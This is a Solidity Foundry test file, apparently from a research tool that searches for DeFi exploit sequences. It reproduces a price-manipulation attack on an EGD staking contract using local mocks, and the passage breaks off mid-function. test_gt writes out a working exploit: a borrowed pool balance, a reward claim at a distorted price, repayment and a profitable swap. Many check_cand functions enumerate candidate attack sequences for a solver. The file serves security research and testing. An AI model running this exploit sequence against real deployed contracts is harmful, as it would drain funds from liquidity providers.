// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./EGD.sol";
import "./EGDStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract EGDTest is Test, BlockLoader {
    EGD egd;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    EGDStaking egdstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address egdAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address egdstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1659914092;
    uint112 reserve0pair = 52443151506653906536540000;
    uint112 reserve1pair = 424456224403899287665961;
    uint32 blockTimestampLastpair = 1659914092;
    uint256 kLastpair = 22259713976354534524259402206876732922981387200000;
    uint256 price0CumulativeLastpair =
        17926177941217205516333779465403739154183922;
    uint256 price1CumulativeLastpair =
        4165161045287207174726887479302333129143660;
    uint256 totalSupplyegd = 118000000000000000000000000;
    uint256 balanceOfegdpair = 52443151506653906536540000;
    uint256 balanceOfegdattacker = 0;
    uint256 balanceOfegdegdstaking = 5670246682724687331970000;
    uint256 totalSupplyusdt = 4979997922172658408539526080;
    uint256 balanceOfusdtpair = 424456224403899287665961;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtegdstaking = 3;

    function setUp() public {
        owner = address(this);
        egd = new EGD();
        egdAddr = address(egd);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(egd),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        egdstaking = new EGDStaking(
            address(egd),
            address(usdt),
            address(router),
            address(pair)
        );
        egdstakingAddr = address(egdstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        egd.transfer(address(pair), balanceOfegdpair);
        usdt.transfer(address(egdstaking), balanceOfusdtegdstaking);
        egd.transfer(address(egdstaking), balanceOfegdegdstaking);
        usdt.transfer(attacker, 100 ether);
        attackContract.setUp(address(usdt), address(egdstaking));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Egd Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(egd), usdt.decimals());
        queryERC20BalanceDecimals(address(egd), address(egd), egd.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(usdt), egd.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(pair), egd.decimals());
        emit log_string("");
        emit log_string("Egdstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(egdstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(egdstaking),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(attackContract),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_egd(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_egd(uint256 amount) internal {
        egd.transfer(owner, amount);
    }

    function borrow_pair_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdt(uint256 amount) internal {
        usdt.transfer(address(pair), amount);
    }

    function borrow_pair_egd(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_egd(uint256 amount) internal {
        egd.transfer(address(pair), amount);
    }

    function swap_pair_egd_usdt(uint256 amount) internal {
        egd.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(egd);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_usdt_egd(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(egd);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_egdstaking_egd(uint256 amount) internal {
        egdstaking.claimAllReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        borrow_owner_usdt(2000e18);
        printBalance("After step0 ");
        borrow_pair_usdt(424526.221219952604636716e18);
        printBalance("After step1 ");
        transaction_egdstaking_egd(0);
        printBalance("After step2 ");
        payback_pair_usdt(uint256(424526.221219952604636716e18 * 1003) / 1000);
        printBalance("After step3 ");
        swap_pair_egd_usdt(egd.balanceOf(address(attacker)));
        printBalance("After step4 ");
        payback_owner_usdt((2000e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_egd_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_usdt_egd(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_egd_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_usdt_egd(amt1);
        swap_pair_egd_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_egd_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_usdt_egd(amt1);
        swap_pair_usdt_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_egd_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_usdt_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        transaction_egdstaking_egd(amt0);
        swap_pair_usdt_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        swap_pair_egd_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
